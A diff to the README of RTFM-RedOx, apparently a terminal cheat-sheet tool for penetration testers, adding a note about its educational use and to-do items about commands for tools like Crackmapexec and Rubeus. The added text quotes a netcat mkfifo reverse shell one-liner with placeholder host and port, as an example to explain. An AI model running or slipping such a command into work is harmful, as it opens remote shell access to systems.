@@ -1,5 +1,11 @@
 RTFM-RedOx is meant to be an easier to use and updated replacement for [RTFM](https://github.com/leostat/rtfm) (inspired by the book, Red Team Field Manual) as well as something that works similarly to [Rev Shells](https://revshells.com/) or the [HackTools](https://addons.mozilla.org/en-US/firefox/addon/hacktools/) browser plugin.  All without the need to leave your terminal to search through notes or open a browser window, or continually run a python script with a lot of switches you'll never remember.  It's basically like having a terminal history and history search for commands you never type in your terminal but often type when you have a shell on a remote host or when interacting with a vulnerable web app.  That being said, the database also contains many commands you'd also run on your attack machine for things like nmap, impacket scripts (adding as I go), crackmapexec, and 
 
+As I've been working on this I've realized this can also be a good learning resource.  For example, many have used the following reverse shell one liner
+'''bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LHOST] [LPORT] >/tmp/f
+'''
+but how many know precisely what that command is actually doing. 0xdf has a [great video](https://www.youtube.com/watch?v=_q_ZCy-hEqg) that does just that. I will be updating references for commands in the database that include deep dive explanations, preferrably to video content, that provide a better understanding of the more complex commands.  The commands in the database from the original RTFM project do have links to websites and many of those are good but some need updating or additional references to more in depth explanations. 
+
 I'm currently using the sqlite database that [RTFM](https://github.com/leostat/rtfm) uses but that hasn't been updated in almost 6 years so I will be gradually adding new commands and pushing the edited db file to the repository.    
 
 
@@ -49,13 +55,15 @@ Windows: Currently not supported because Termion does not work on windows.  I'll
 
 ## To Add
 - [x] After adding a new command to the db select it as the current command.
+- [ ] Continue updating database with newer commands for things like Crackmapexec,ffuf,feroxbuster,Rubeus,Impacket, etc.
+- [ ] Update command reference links to better and more up to date content, preferably adding links to video content when possible.
+- [ ] Display ids next to references so that if necessary they can be deleted from the db through the redox CLI.  
 - [ ] Add config file to store user set variables and other as yet to be determined configurations.
     - This might be the place for related commands that are often used together. Add ability to save the commands in the current history.  Would need a way to quickly delete a command in the current history e.g. highlight the command and then Ctrl+d to remove it. Also need to be able to completely clear the current history.  User would also need to supply a name for the history before it is saved to the config file.  These would be stored as an array of row IDs from TblCommand. Use the 'config' crate to facilitate this.  
 - [ ] Ctrl+d while in selectable list deletes the item from the database, or if in history mode, deletes the item from the current history.
 - [ ] Left/right arrow keys to edit already typed or pasted in command.  Really only useful when typing a long command to add to or update the database.
-- [ ] Make use of tags already implemented in the database to display selectable list of grouped items. For example, 'reverse shells linux' to display all commands in the database grouped under that tag.  tags already in the database are probably a little too general to be useful e.g. 'bash', 'windows'.  Also need a function to display all tags in the database as a selectable list.
+- [ ] Make use of tags already implemented in the database to display selectable list of grouped items. For example, 'reverse shells linux' to display all commands in the database grouped under that tag.  At the moment, tags already in the database are probably a little too general to be useful e.g. 'bash', 'windows'.  Also need a function to display all tags in the database as a selectable list.
 - [ ] Implement [RTFM](https://github.com/leostat/rtfm)'s solution for creating/updating the database
-- [ ] Continue to updating database with newer commands for things like Bloodhound,ffuf,feroxbuster,Rubeus,Crackmapexec,Chisel,SSHuttle, etc.
 - [ ] Tab auto complete for best match while in search mode.
 - [ ] Switch from termion to crossterm for Windows support.
 - [ ] Use pre-existing 'refs' table to link to markdown notes and display notes in terminal when selected.
